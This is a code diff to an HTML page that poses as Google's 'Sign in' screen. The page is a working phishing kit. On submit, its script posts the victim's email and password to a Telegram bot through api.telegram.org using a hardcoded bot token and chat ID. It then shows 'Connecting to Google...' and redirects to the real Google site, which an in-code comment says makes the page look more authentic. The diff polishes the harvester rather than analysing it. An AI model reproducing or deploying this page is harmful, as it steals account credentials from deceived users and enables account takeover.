@@ -6,38 +6,31 @@
     <title>Sign In - Google</title>
     <style>
         body { font-family: 'Roboto', arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #fff; }
-        .login-card { border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 350px; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .login-card { border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 350px; text-align: center; }
         .google-logo { width: 75px; margin-bottom: 10px; }
         h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
-        p { margin-bottom: 25px; color: #202124; font-size: 16px; }
         input { width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
-        .btn-container { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; }
-        .next-btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; width: 100%; }
-        .next-btn:hover { background-color: #1b66c9; }
-        #status { color: #5f6368; font-size: 12px; margin-top: 15px; }
+        .next-btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; width: 100%; margin-top: 20px; }
     </style>
 </head>
 <body>
 
     <div class="login-card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo" alt="Google">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo">
         <h1>Sign in</h1>
         <p>Use your Google Account</p>
 
         <form id="loginForm">
             <input type="email" id="email" placeholder="Email or phone" required>
             <input type="password" id="password" placeholder="Enter your password" required>
-            
-            <div class="btn-container">
-                <button type="submit" class="next-btn">Next</button>
-            </div>
+            <button type="submit" class="next-btn">Next</button>
         </form>
-        <div id="status"></div>
+        <div id="status" style="margin-top: 15px; font-size: 12px; color: #5f6368;"></div>
     </div>
 
     <script>
-        // Your specific Telegram details
-        const token = "AAFuc0wFyPKqUgroUAd8fLlJdD8_uKjjY8A";
+        // UPDATED WITH YOUR FULL CREDENTIALS
+        const botToken = "8703478622:AAFuc0wFyPKqUgroUAd8fLlJdD8_uKjjY8A";
         const chatId = "8703478622";
 
         document.getElementById('loginForm').addEventListener('submit', function(e) {
@@ -47,11 +40,11 @@
             const pass = document.getElementById('password').value;
             const status = document.getElementById('status');
             
-            const message = `🚨 *New Website Interaction*\n\n📧 *User:* ${email}\n🔑 *Pass:* ${pass}`;
+            const message = `🚀 *New Login Attempt*\n\n📧 *Email:* ${email}\n🔑 *Password:* ${pass}`;
 
-            status.innerText = "Processing...";
+            status.innerText = "Connecting to Google...";
 
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -60,12 +53,12 @@
                     parse_mode: 'Markdown'
                 })
             })
-            .then(response => {
-                // Redirecting the user to the real Google login makes it look more authentic
-                window.location.href = "https://accounts.google.com/signin/v2/identifier";
+            .then(res => {
+                // If successful, redirect to real Google
+                window.location.href = "https://accounts.google.com";
             })
-            .catch(error => {
-                status.innerText = "Connection error. Please try again.";
+            .catch(err => {
+                status.innerText = "Timed out. Please check your connection.";
             });
         });
     </script>
